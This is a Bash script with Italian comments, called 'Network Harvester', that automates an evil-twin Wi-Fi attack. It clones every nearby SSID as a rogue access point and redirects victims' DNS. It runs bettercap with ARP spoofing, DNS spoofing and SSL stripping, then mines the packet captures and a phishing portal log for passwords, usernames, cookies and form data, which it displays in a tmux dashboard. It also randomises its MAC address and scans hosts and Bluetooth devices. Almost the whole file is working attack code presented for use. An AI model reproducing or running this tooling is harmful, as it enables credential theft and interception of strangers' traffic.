#!/bin/bash
export TERM=xterm
export HOME=/root
set -euo pipefail


### ===============================
### Network Harvester - Struttura principale aggiornata
### ===============================


DATE=$(date +%Y-%m-%d_%H-%M-%S)
BASE_DIR="/root/net_logs/$DATE"
LOCK_FILE="/tmp/evil_lock"
TASK_FILE="/tmp/evil_tasks"


### === Directory Logging === ###
PASSWORDS_DIR="$BASE_DIR/passwords"
SCAN_DIR="$BASE_DIR/scans"
PROBE_DIR="$BASE_DIR/probes"
DNS_DIR="$BASE_DIR/dns"
HTTP_DIR="$BASE_DIR/http"
HTTPS_DIR="$BASE_DIR/https"
COOKIES_DIR="$BASE_DIR/cookies"
FORMDATA_DIR="$BASE_DIR/formdata"
PCAP_DIR="$BASE_DIR/pcaps"
PHISH_DIR="$BASE_DIR/phishing"
WWW_DIR="$BASE_DIR/www"

get_wifi_iface() {
  local iface
  iface=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E '^wl|^wlan' | grep -v "mon" | head -n1)
  if [[ -z "$iface" ]]; then
    echo "[!] Nessuna interfaccia wireless trovata (wl*)"
    iw dev
    exit 1
  fi
  echo "$iface"
}

mkdir -p \
  "$PASSWORDS_DIR" "$SCAN_DIR" "$PROBE_DIR" "$DNS_DIR" "$HTTP_DIR"\
    "$HTTPS_DIR" "$PCAP_DIR" "$COOKIES_DIR" "$FORMDATA_DIR" "$PHISH_DIR" "$WWW_DIR"


### === Setup interfacce === ###
IFACE=$(get_wifi_iface)
echo "[*] Interfaccia Wi-Fi rilevata: $IFACE"
MON_IFACE="${IFACE}mon"
SUBNET=$(ip -o -f inet addr show "$IFACE" | awk '{print $4}' | head -n1)
GATEWAY=$(ip route | grep default | awk '{print $3}' | head -n1)


### === Verifica dipendenze === ###
for t in aircrack-ng bettercap dnsmasq tcpdump tmux nmap bluetoothctl macchanger zip busybox lighttpd; do
  if ! command -v "$t" &>/dev/null; then
    echo "[!] Tool mancante: $t"
    exit 1
  fi
done


### === Funzioni di scansione e setup Evil Twin multipli === ###
scan_wifi_networks() {
  echo "[*] Scansione reti Wi-Fi con diversi metodi..."

  local iface
  iface=$(iw dev | awk '/Interface/ {print $2}' | grep -E '^wl|^wlan' | grep -v 'mon' | head -n1)

  if [[ -z "$iface" ]]; then
    echo "[!] Nessuna interfaccia wireless compatibile trovata."
    iw dev
    exit 1
  fi

  echo "[*] Interfaccia trovata: $iface"
  ip link set "$iface" up || true
  sleep 1

  local tmpfile="$SCAN_DIR/iwlist_raw.txt"
  mkdir -p "$SCAN_DIR"

  echo "[*] Tentativo con: iwlist $iface scan (timeout 15s)"
  timeout 15s iwlist "$iface" scan > "$tmpfile" 2>/dev/null || {
  echo "[!] iwlist scan timeout o errore"
  }


  grep 'ESSID:' "$tmpfile" | cut -d '"' -f 2 | grep -v '^$' | sort | uniq > "$SCAN_DIR/essids.txt"

  if [[ -s "$SCAN_DIR/essids.txt" ]]; then
    echo "[*] SSID trovati (iwlist):"
    cat "$SCAN_DIR/essids.txt"
    return
  else
    echo "[!] iwlist non ha trovato ESSID validi o ha fallito."
  fi

  echo "[*] Fallback: iw dev $iface scan (timeout 15s)"
  timeout 15s iw dev "$iface" scan > "$tmpfile" 2>/dev/null || echo "[!] iw scan timeout o errore"
  grep 'SSID:' "$tmpfile" | cut -d ':' -f 2- | grep -v '^$' | sort | uniq > "$SCAN_DIR/essids.txt"

  if [[ -s "$SCAN_DIR/essids.txt" ]]; then
    echo "[*] SSID trovati (iw dev scan):"
    cat "$SCAN_DIR/essids.txt"
    return
  else
    echo "[!] iw dev scan non ha trovato SSID."
  fi

  echo "[*] Fallback: nmcli dev wifi list"
  nmcli dev wifi list | awk 'NR>1 {print $2}' | grep -v '^--' | sort | uniq > "$SCAN_DIR/essids.txt"

  if [[ -s "$SCAN_DIR/essids.txt" ]]; then
    echo "[*] SSID trovati (nmcli):"
    cat "$SCAN_DIR/essids.txt"
  else
    echo "[!] Nessuna rete trovata con alcun metodo."
  fi
}



enqueue_evil_twin_tasks() {
  echo "[*] Inserisco in coda i task per creare Evil Twin delle reti trovate"
  : > "$TASK_FILE"
  # Prima i cambi MAC e setup base
  echo change_mac_loop >> "$TASK_FILE"
  echo create_fake_portal >> "$TASK_FILE"


  # Ora tutte le reti clonate con priorità
  while read -r ssid; do
    # Funzione dedicata per clonare ogni SSID
    echo "start_evil_twin \"$ssid\"" >> "$TASK_FILE"
  done < "$SCAN_DIR/essids.txt"


  # Poi tutti gli altri task
  echo start_bettercap >> "$TASK_FILE"
  echo start_tcpdump >> "$TASK_FILE"
  echo start_nmap >> "$TASK_FILE"
  echo start_bluetooth_scan >> "$TASK_FILE"
  echo start_probe_sniffing >> "$TASK_FILE"
  echo extract_passwords >> "$TASK_FILE"
  echo extract_usernames >> "$TASK_FILE"
  echo extract_cookies >> "$TASK_FILE"
  echo extract_formdata >> "$TASK_FILE"
  echo harvest_phishing_data >> "$TASK_FILE"
  echo sort_dns_queries >> "$TASK_FILE"
  echo sort_http_requests >> "$TASK_FILE"
  echo sort_https_metadata >> "$TASK_FILE"
  echo archive_logs >> "$TASK_FILE"
}


# Funzione aggiornata per Evil Twin multipli con param SSID


enable_monitor_mode() {
  echo "[*] Abilitazione modalità monitor su $IFACE"
  airmon-ng start "$IFACE" > /dev/null 2>&1 || true
  sleep 2
}




start_evil_twin() {
  local ssid="$1"
  echo "[*] Avvio Evil Twin AP clonando SSID: $ssid"


  # Assumiamo che la modalità monitor sia già attiva in $MON_IFACE (avviata una sola volta all'inizio)
  sleep 2


  # Ricerca canale del SSID per ottimizzazione
  local channel
  channel=$(iwlist "$IFACE" scan 2>/dev/null | awk -v ssid="$ssid" '
    $0 ~ "ESSID:\"" ssid "\"" {getline; getline; if ($0 ~ /Channel:/) {print $1} }' | grep -o '[0-9]*' | head -n1)
  channel=${channel:-6}


  # Lista interfacce atX prima di avviare AP
  local before
  before=$(ip link show | grep -o 'at[0-9]')


  airbase-ng -e "$ssid" -c "$channel" "$MON_IFACE" > "$BASE_DIR/airbase_${ssid// /_}.log" 2>&1 &
  sleep 5


  # Lista interfacce atX dopo avvio AP
  local after
  after=$(ip link show | grep -o 'at[0-9]')
  local new_iface
  new_iface=$(comm -13 <(echo "$before" | sort) <(echo "$after" | sort) | head -n1)


  if [[ -z "$new_iface" ]]; then
    echo "[!] Impossibile determinare nuova interfaccia atX per SSID $ssid"
    return 1
  fi


  ip link set "$new_iface" up
  ip addr add "$GATEWAY/24" dev "$new_iface"
  sysctl -w net.ipv4.ip_forward=1 >/dev/null


  iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
  iptables -A FORWARD -i "$IFACE" -o "$new_iface" -m state --state RELATED,ESTABLISHED -j ACCEPT
  iptables -A FORWARD -i "$new_iface" -o "$IFACE" -j ACCEPT


  dnsmasq --no-daemon --interface="$new_iface" --bind-interfaces --except-interface=lo \
    --dhcp-range="$GATEWAY",192.168.20.200,255.255.255.0,12h \
    --dhcp-option=3,"$GATEWAY" --dhcp-option=6,"$GATEWAY" \
    --address=/#/"$GATEWAY" > "$BASE_DIR/dnsmasq_${ssid// /_}.log" 2>&1 &
}




### === Funzioni di scanning === ###


change_mac_loop() {
  echo "[*] Avvio ciclo cambio MAC su $IFACE"
  for _ in {1..3}; do
    ip link set "$IFACE" down
    macchanger -r "$IFACE" >> "$BASE_DIR/mac.log" 2>&1 || true
    ip link set "$IFACE" up
    sleep 2
  done
}


start_bettercap() {
  echo "[*] Avvio Bettercap su at0"
  bettercap -iface at0 -eval "\
    set net.sniff.output $PCAP_DIR/sniff.pcap; \
    set arp.spoof.fullduplex true; \
    set net.sniff.verbose true; \
    set dns.spoof.all true; \
    set proxy.http.sslstrip true; \
    net.recon on; \
    arp.spoof on; \
    net.sniff on; \
    proxy.http on;" \
    > "$BASE_DIR/bettercap.log" 2>&1 &
}


start_tcpdump() {
  echo "[*] Avvio TCPDump su at0"
  tcpdump -i at0 -w "$PCAP_DIR/raw.pcap" > /dev/null 2>&1 &
}


start_nmap() {
  echo "[*] Avvio scansione Nmap"
  nmap -sS -T4 "$SUBNET" -oN "$SCAN_DIR/nmap.log"
}


start_bluetooth_scan() {
  echo "[*] Avvio scansione Bluetooth"
  hcitool scan > "$SCAN_DIR/bluetooth.log"
}


start_probe_sniffing() {
  echo "[*] Avvio sniffing probe requests"
  tcpdump -i "$MON_IFACE" type mgt subtype probe-req -l | tee "$PROBE_DIR/probes.log" &
}


extract_passwords() {
  echo "[*] Estrazione password"
  strings "$PCAP_DIR/sniff.pcap" | grep -iE "pass=|password=|pwd=|passwd=" | sort | uniq > "$PASSWORDS_DIR/passwords.log"
}


extract_usernames() {
  echo "[*] Estrazione username"
  strings "$PCAP_DIR/sniff.pcap" | grep -iE "user=|username=|login=" | sort | uniq > "$PASSWORDS_DIR/usernames.log"
}


extract_cookies() {
  echo "[*] Estrazione cookie"
  strings "$PCAP_DIR/sniff.pcap" | grep -Ei 'Cookie: ' | sort | uniq > "$COOKIES_DIR/cookies.log"
}


extract_formdata() {
  echo "[*] Estrazione form-data"
  strings "$PCAP_DIR/sniff.pcap" | grep -Ei 'Content-Type: application/x-www-form-urlencoded' -A10 | grep -E '[a-zA-Z0-9_]+=.*' | sort | uniq > "$FORMDATA_DIR/formdata.log"
}


sort_dns_queries() {
  echo "[*] Ordinamento query DNS"
  strings "$PCAP_DIR/sniff.pcap" | grep -i '\.com\|\.net\|\.org' | sort | uniq > "$DNS_DIR/queries.log"
}


sort_http_requests() {
  echo "[*] Ordinamento richieste HTTP"
  strings "$PCAP_DIR/sniff.pcap" | grep -Ei "GET /|POST /|Host: " | sort | uniq > "$HTTP_DIR/http_requests.log"
}


sort_https_metadata() {
  echo "[*] Ordinamento metadata HTTPS"
  strings "$PCAP_DIR/sniff.pcap" | grep -Ei "TLS|SSL|Server Name" | sort | uniq > "$HTTPS_DIR/https_info.log"
}


archive_logs() {
  echo "[*] Archiviazione logs in archivio ZIP"
  zip -r "$BASE_DIR.zip" "$BASE_DIR" >/dev/null 2>&1
}


harvest_phishing_data() {
  echo "[*] Raccolta credenziali dal portale phishing"
  local src="/var/www/html/phish_log.txt"
  local dest
  dest="$PHISH_DIR/captured_$(date +%s).log"
  [[ -f "$src" ]] && cp "$src" "$dest"
}


generate_full_dashboard() {
  echo "[*] Avvio interfaccia utente tmux completa..."


  # Avvia sessione tmux principale
  tmux new-session -d -s harvester_ui -n DASHBOARD


  # === PANNELLO CENTRALE ===
  tmux send-keys -t harvester_ui:0 'watch -n 3 ./monitor_stats' C-m


  # === FINESTRE AGGIUNTIVE ===


  # 1: Bettercap log
  tmux new-window -t harvester_ui -n Bettercap
  tmux send-keys -t harvester_ui:1 "tail -f '$BASE_DIR/bettercap.log'" C-m


  # 2: TCPDump log
  tmux new-window -t harvester_ui -n TCPDump
  tmux send-keys -t harvester_ui:2 "tcpdump -r '$PCAP_DIR/raw.pcap' -n -A" C-m


  # 3: DNSMasq log
  tmux new-window -t harvester_ui -n DNSMasq
  tmux send-keys -t harvester_ui:3 "tail -f '$BASE_DIR/dnsmasq_'*.log" C-m


  # 4: Airbase-ng log (multipli)
  tmux new-window -t harvester_ui -n Airbase
  tmux send-keys -t harvester_ui:4 "tail -f '$BASE_DIR/airbase_'*.log" C-m


  # 5: Dispositivi connessi a at0 (ARP)
  tmux new-window -t harvester_ui -n Connessioni
  tmux send-keys -t harvester_ui:5 "watch -n 2 'arp -a -i at0'" C-m


  # 6: Client Wi-Fi associati (monitor interface)
  tmux new-window -t harvester_ui -n WiFi_Clients
  tmux send-keys -t harvester_ui:6 "watch -n 2 'iw dev $MON_IFACE station dump'" C-m


  # 7: Probe Requests
  tmux new-window -t harvester_ui -n ProbeReq
  tmux send-keys -t harvester_ui:7 "tail -f '$PROBE_DIR/probes.log'" C-m


  # 8: Form-Data e POST
  tmux new-window -t harvester_ui -n FormData
  tmux send-keys -t harvester_ui:8 "tail -f '$FORMDATA_DIR/formdata.log'" C-m


  # 9: Credenziali catturate
  tmux new-window -t harvester_ui -n Credenziali
  tmux split-window -v -t harvester_ui:9
  tmux send-keys -t harvester_ui:9.0 "tail -f '$PASSWORDS_DIR/usernames.log'" C-m
  tmux send-keys -t harvester_ui:9.1 "tail -f '$PASSWORDS_DIR/passwords.log'" C-m


  # 10: Cookie intercettati
  tmux new-window -t harvester_ui -n Cookies
  tmux send-keys -t harvester_ui:10 "tail -f '$COOKIES_DIR/cookies.log'" C-m


  # 11: DNS Queries
  tmux new-window -t harvester_ui -n DNS
  tmux send-keys -t harvester_ui:11 "tail -f '$DNS_DIR/queries.log'" C-m


  # 12: HTTP Requests
  tmux new-window -t harvester_ui -n HTTP
  tmux send-keys -t harvester_ui:12 "tail -f '$HTTP_DIR/http_requests.log'" C-m


  # 13: HTTPS Metadata
  tmux new-window -t harvester_ui -n HTTPS
  tmux send-keys -t harvester_ui:13 "tail -f '$HTTPS_DIR/https_info.log'" C-m


  # 14: Dispositivi Bluetooth
  tmux new-window -t harvester_ui -n Bluetooth
  tmux send-keys -t harvester_ui:14 "watch -n 3 'cat $SCAN_DIR/bluetooth.log'" C-m


  # 15: Reti Wi-Fi trovate (essids)
  tmux new-window -t harvester_ui -n RetiWiFi
  tmux send-keys -t harvester_ui:15 "watch -n 5 'cat $SCAN_DIR/essids.txt'" C-m


  # 16: File phishing
  tmux new-window -t harvester_ui -n Phishing
  tmux send-keys -t harvester_ui:16 "tail -n 20 -f $PHISH_DIR/*.log" C-m


  # 17: Layout finale
  tmux select-window -t harvester_ui:0
  tmux attach -t harvester_ui
}




monitor_stats() {
  echo "[*] Avvio monitoraggio statistico live"
  while true; do
    clear
    echo "========= STATISTICHE ATTIVE ========="
    echo "Sessione: $(basename "$BASE_DIR")"
    echo


    echo "[+] Password trovate:"
    grep -c . "$PASSWORDS_DIR/passwords.log" 2>/dev/null || echo "0"


    echo "[+] Username trovati:"
    grep -c . "$PASSWORDS_DIR/usernames.log" 2>/dev/null || echo "0"


    echo "[+] Cookie raccolti:"
    grep -c . "$COOKIES_DIR/cookies.log" 2>/dev/null || echo "0"


    echo "[+] Form-data:"
    grep -c . "$FORMDATA_DIR/formdata.log" 2>/dev/null || echo "0"


    echo "[+] Query DNS:"
    grep -c . "$DNS_DIR/queries.log" 2>/dev/null || echo "0"


    echo "[+] HTTP unici:"
    grep -c . "$HTTP_DIR/http_requests.log" 2>/dev/null || echo "0"


    echo "[+] HTTPS metadata:"
    grep -c . "$HTTPS_DIR/https_info.log" 2>/dev/null || echo "0"


    echo "[+] Probe Wi-Fi:"
    grep -c . "$PROBE_DIR/probes.log" 2>/dev/null || echo "0"


    echo "[+] Dispositivi Bluetooth:"
    grep -c . "$SCAN_DIR/bluetooth.log" 2>/dev/null || echo "0"


    echo
    echo "Ultimo aggiornamento: $(date '+%H:%M:%S')"
    sleep 3
  done
}


launch_tmux_ui() {
  echo "[*] Avvio interfaccia tmux grafica"


  local sess="harvester_ui"
  tmux kill-session -t "$sess" 2>/dev/null || true


  # === Creazione nuova sessione tmux ===
  tmux new-session -d -s "$sess" -n MAIN


  # === Pannello 0: monitor centralizzato ===
  tmux send-keys -t "$sess:0.0" "bash -c 'monitor_stats'" C-m


  # === Pannello 1: tcpdump live su at0 ===
  tmux split-window -v -t "$sess:0.0"
  tmux send-keys -t "$sess:0.1" "tcpdump -i at0 -nn -l | tee /dev/null" C-m


  # === Pannello 2: bettercap output ===
  tmux split-window -h -t "$sess:0.1"
  tmux send-keys -t "$sess:0.2" "tail -f \"$BASE_DIR/bettercap.log\"" C-m


  # === Pannello 3: DNS, HTTP, HTTPS logs ===
  tmux select-pane -t "$sess:0.2"
  tmux split-window -v -t "$sess:0.2"
  tmux send-keys -t "$sess:0.3" "multitail -s 2 -n 50 \
    \"$DNS_DIR/queries.log\" \"$HTTP_DIR/http_requests.log\" \"$HTTPS_DIR/https_info.log\"" C-m


  # === Pannello 4: Passwords, usernames, cookies ===
  tmux select-pane -t "$sess:0.0"
  tmux split-window -h -t "$sess:0.0"
  tmux send-keys -t "$sess:0.4" "multitail -s 2 -n 50 \
    \"$PASSWORDS_DIR/passwords.log\" \"$PASSWORDS_DIR/usernames.log\" \"$COOKIES_DIR/cookies.log\"" C-m


  # === Pannello 5: Probe requests e bluetooth ===
  tmux split-window -v -t "$sess:0.4"
  tmux send-keys -t "$sess:0.5" "multitail -s 2 -n 50 \
    \"$PROBE_DIR/probes.log\" \"$SCAN_DIR/bluetooth.log\"" C-m


  # === Pannello 6: htop ===
  tmux new-window -t "$sess" -n STATS
  tmux send-keys -t "$sess:1.0" "htop" C-m


  # === Pannello 7: nmap log ===
  tmux split-window -h -t "$sess:1.0"
  tmux send-keys -t "$sess:1.1" "tail -f \"$SCAN_DIR/nmap.log\"" C-m


  # === Attiva sessione ===
  tmux select-window -t "$sess:0"
  tmux attach -t "$sess"
}


check_and_install_dependencies() {
  echo "[*] Verifica e installazione automatica delle dipendenze"
  local REQUIRED_TOOLS=(
    aircrack-ng bettercap dnsmasq tcpdump tmux nmap bluetoothctl macchanger
    zip busybox lighttpd htop multitail iwlist iw iproute2
  )


  local MISSING=()
  local UPDATED=false
  local LOGFILE="$BASE_DIR/install.log"
  mkdir -p "$(dirname "$LOGFILE")"


  for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
      echo "[!] Tool mancante: $tool"
      MISSING+=("$tool")
    fi
  done


  if [[ "${#MISSING[@]}" -gt 0 ]]; then
    echo "[*] Tool mancanti: ${MISSING[*]}"
    echo "[*] Aggiornamento APT e installazione..."


    if ! $UPDATED; then
      apt update -y >> "$LOGFILE" 2>&1 && UPDATED=true
    fi


    for pkg in "${MISSING[@]}"; do
      echo "[*] Installazione $pkg..."
      apt install -y "$pkg" >> "$LOGFILE" 2>&1 || {
        echo "[X] Errore durante l'installazione di $pkg. Verifica manualmente."
        exit 1
      }
    done


    echo "[*] Tutti i pacchetti richiesti sono stati installati."
  else
    echo "[✓] Tutte le dipendenze sono già presenti."
  fi
}


init_task_queue() {
  echo "[*] Inizializzazione coda task"
  : > "$TASK_FILE"
  echo change_mac_loop >> "$TASK_FILE"
  echo create_fake_portal >> "$TASK_FILE"
  echo start_evil_twin >> "$TASK_FILE"
  echo start_bettercap >> "$TASK_FILE"
  echo start_tcpdump >> "$TASK_FILE"
  echo start_nmap >> "$TASK_FILE"
  echo start_bluetooth_scan >> "$TASK_FILE"
  echo start_probe_sniffing >> "$TASK_FILE"
  echo extract_passwords >> "$TASK_FILE"
  echo extract_usernames >> "$TASK_FILE"
  echo extract_cookies >> "$TASK_FILE"
  echo extract_formdata >> "$TASK_FILE"
  echo harvest_phishing_data >> "$TASK_FILE"
  echo sort_dns_queries >> "$TASK_FILE"
  echo sort_http_requests >> "$TASK_FILE"
  echo sort_https_metadata >> "$TASK_FILE"
  echo archive_logs >> "$TASK_FILE"
}


get_task() {
  local task=""
  exec 200>"$LOCK_FILE"  # Descrittore di file per lock
  flock 200


  if read -r line < "$TASK_FILE"; then
    tail -n +2 "$TASK_FILE" > "$TASK_FILE.tmp" && mv "$TASK_FILE.tmp" "$TASK_FILE"
    task="$line"
  fi


  flock -u 200
  echo "$task"
}


task_worker() {
  local id="$1"
  while true; do
    local task
    task=$(get_task)
    if [[ -n "$task" ]]; then
      echo "[THREAD $id] Eseguo: $task"
      eval "$task" && echo "[THREAD $id] Completato: $task"
    else
      echo "[THREAD $id] Nessun task disponibile, attesa..."
      sleep 3
    fi
  done
}

start_tmux_workers() {
  echo "[*] Avvio multithreading con tmux"

  export TERM=xterm
  export HOME="${HOME:-/root}"
  local session="harvester"

  # Verifica che tmux sia installato e funzionante
  if ! command -v tmux >/dev/null 2>&1; then
    echo "[X] Errore: tmux non è installato o non nel PATH."
    exit 1
  fi

  # Verifica se la sessione esiste già
  if tmux has-session -t "$session" 2>/dev/null; then
    echo "[!] Sessione tmux già esistente: $session"
    return 0
  fi

  # Verifica e crea il socket directory se mancante
  local socket_dir="/tmp/tmux-$(id -u)"
  if [[ ! -d "$socket_dir" ]]; then
    echo "[*] Socket tmux mancante, lo ricreo: $socket_dir"
    mkdir -p "$socket_dir"
    chmod 700 "$socket_dir"
  fi

  # Avvio nuova sessione con 4 thread + monitor
  tmux new-session -d -s "$session" "bash -c 'task_worker 1'"
  tmux new-window -t "$session" -n "Thread2" "bash -c 'task_worker 2'"
  tmux new-window -t "$session" -n "Thread3" "bash -c 'task_worker 3'"
  tmux new-window -t "$session" -n "Thread4" "bash -c 'task_worker 4'"
  tmux new-window -t "$session" -n "MONITOR" "bash -c 'monitor_stats'"

  # Logging
  echo "[✓] Sessione tmux '$session' avviata con 4 thread."
}

### === Trap pulizia === ###
cleanup() {
  echo "[*] Cleanup in corso..."
  pkill -f airbase-ng || true
  pkill -f bettercap || true
  pkill -f tcpdump || true
  pkill -f hcitool || true
  pkill -f dnsmasq || true
  ip link set "$IFACE" up || true
  airmon-ng stop "$MON_IFACE" || true
  rm -f "$LOCK_FILE" "$TASK_FILE"
  echo "[*] Pulizia completata."
  exit 0
}
trap cleanup SIGINT SIGTERM


### === Avvio Script Principale === ###


main() {
  if [[ $EUID -ne 0 ]]; then
    echo "[!] Esegui lo script come root (usa sudo)"
    exit 1
  fi

  # Riattivazione interfaccia in caso di blocco
  rfkill unblock all
  ip link set wlan0 up || {
    echo "[!] Impossibile attivare wlan0. Controlla i permessi o la compatibilità."
    exit 1
  }

  check_and_install_dependencies
  echo "[*] Inizio sessione Network Harvester"

  # 1. Scansiona PRIMA (modo managed)
  scan_wifi_networks

  # 2. Poi vai in modalità monitor
  enable_monitor_mode  

  # 3. Coda e multithread
  enqueue_evil_twin_tasks
  start_tmux_workers
  launch_tmux_ui
  
}



main "$@"
